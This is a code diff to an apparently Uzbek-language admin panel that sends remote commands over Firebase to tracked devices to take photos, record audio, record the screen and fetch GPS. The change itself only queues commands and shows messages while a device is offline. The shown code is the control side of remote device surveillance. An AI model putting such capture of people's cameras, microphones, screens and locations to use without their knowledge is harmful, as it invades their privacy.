@@ -258,8 +258,9 @@ function updateAdminStatusHeader() {
 
   badgeEl.innerHTML = `
     <div style="display: flex; align-items: center; gap: 6px;">
-      <span style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: ${isOnline ? '#16A34A' : '#94A3B8'};"></span>
-      <span style="font-weight: bold; color: ${isOnline ? '#16A34A' : '#64748B'};">${isOnline ? 'Online (Faol)' : 'Offline (Aloqa yo\'q)'}</span>
+      <span style="display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: ${isOnline ? '#16A34A' : '#F59E0B'};"></span>
+      <span style="font-weight: bold; color: ${isOnline ? '#16A34A' : '#D97706'};">${isOnline ? 'Online (Faol)' : 'Offline (Kutish rejimida)'}</span>
+      ${!isOnline ? '<span style="font-size: 10px; color: var(--text-secondary); margin-left: 4px;">(Buyruqlar navbatga yoziladi)</span>' : ''}
     </div>
     <div style="color: var(--text-secondary); font-weight: 600;">
       ${batteryStr}
@@ -280,12 +281,14 @@ function updateAdminMapLocation(lat, lon) {
 // Commands
 function adminSendTakePhoto() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/take_photo`).set(Date.now());
-  showToast("📷 Rasm olish buyrug'i yuborildi!");
+  showToast(isOnline ? "📷 Rasm olish buyrug'i yuborildi!" : "📷 Rasm olish buyrug'i navbatga qo'yildi (qurilma ulanganda olinadi)");
 }
 
 function adminToggleRecordAudio() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   const nextState = !adminDeviceData.isAudioRecordingActive;
   adminDeviceData.isAudioRecordingActive = nextState;
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_audio`).set(nextState);
@@ -295,19 +298,21 @@ function adminToggleRecordAudio() {
     btn.innerText = nextState ? "⏹ To'xtatish" : "🎙️ Ovoz Yozish";
     btn.className = nextState ? "btn btn-red" : "btn btn-yellow";
   }
-  showToast(nextState ? "🎙️ Masofaviy ovoz yozish boshlandi" : "🎙️ Ovoz yozish to'xtatildi, saqlanmoqda...");
+  showToast(nextState ? (isOnline ? "🎙️ Masofaviy ovoz yozish boshlandi" : "🎙️ Ovoz yozish navbatga qo'yildi") : "🎙️ Ovoz yozish to'xtatildi, saqlanmoqda...");
 }
 
 function adminSendRecordScreen() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/record_screen`).set(Date.now());
-  showToast("📹 Ekran zapis buyrug'i yuborildi!");
+  showToast(isOnline ? "📹 Ekran zapis buyrug'i yuborildi!" : "📹 Ekran zapis navbatga qo'yildi");
 }
 
 function adminSendRequestGps() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
+  const isOnline = (Date.now() - adminDeviceData.heartbeat) < 65000;
   window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands/request_gps`).set(Date.now());
-  showToast("🛰️ GPS yangilash so'rovi yuborildi!");
+  showToast(isOnline ? "🛰️ GPS yangilash so'rovi yuborildi!" : "🛰️ GPS so'rovi navbatga qo'yildi");
 }
 
 // Photos Viewer
